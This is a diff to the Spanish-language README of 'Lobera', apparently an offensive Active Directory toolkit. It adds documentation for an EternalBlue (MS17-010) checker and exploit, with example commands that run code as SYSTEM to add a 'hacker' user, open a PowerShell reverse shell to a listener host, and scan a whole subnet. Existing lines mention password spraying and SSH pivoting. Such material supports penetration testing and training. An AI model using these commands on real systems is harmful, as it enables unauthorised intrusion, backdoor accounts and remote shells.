@@ -54,6 +54,7 @@ Además del CLI principal, Lobera incluye cuatro herramientas autónomas instala
 | `lobera-watch` | Monitor de eventos AD en tiempo real vía LDAP |
 | `lobera-spray` | Sprayer multiprotocolo con medidas anti-lockout |
 | `lobera-tunnel` | Proxy SOCKS5 y reenvío de puertos sobre SSH para pivoting |
+| `lobera-check`  | Checker y exploit de vulnerabilidades conocidas (MS17-010 / EternalBlue) |
 
 Cada herramienta muestra su menú completo con ejemplos al ejecutarla sin argumentos.
 
@@ -118,6 +119,22 @@ lobera-tunnel reverse -t PIVOT -u user -p 'P@ss' --remote-port 4444 --local-port
 
 # Varios túneles desde YAML
 lobera-tunnel multi -t PIVOT -u user -p 'P@ss' --config tunnels.yaml
+```
+
+### lobera-check
+
+```bash
+# Comprobar si un host es vulnerable a EternalBlue
+lobera-check ms17010 check -t 192.168.1.10
+
+# Ejecutar un comando como SYSTEM
+lobera-check ms17010 exploit -t 192.168.1.10 --payload cmd --cmd "net user hacker P@ss1234 /add"
+
+# Reverse shell PowerShell
+lobera-check ms17010 exploit -t 192.168.1.10 --payload shell --lhost 192.168.1.5 --lport 4444
+
+# Escanear un rango completo
+for ip in 192.168.1.{1..254}; do lobera-check ms17010 check -t $ip 2>/dev/null; done
 ```
 
 ---
